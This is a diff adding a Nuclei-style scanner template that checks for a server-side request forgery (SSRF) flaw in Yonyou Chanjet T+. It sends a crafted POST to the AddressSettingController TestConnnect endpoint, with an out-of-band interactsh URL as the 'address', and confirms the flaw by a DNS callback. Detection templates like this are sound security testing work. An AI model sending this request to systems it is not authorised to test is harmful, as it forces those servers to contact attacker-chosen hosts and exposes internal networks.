@@ -1,0 +1,29 @@
+id: ChangJieTong-AddressSettingController-SSRF
+
+info:
+  name: 用友 畅捷通 AddressSettingController 存在 SSRF
+  author: proud
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: SSRF YongYou
+
+http:
+  - raw:
+      - |-
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.UA.AddressSettingController,Ufida.T.SM.UIP.ashx?method=TestConnnect HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 36
+
+        {
+          "address":"{{interactsh-url}}"
+        }
+
+    matchers:
+      - type: dsl
+        name: SSRF
+        dsl:
+          - "status_code==200 && contains_all(interactsh_protocol, 'dns')"
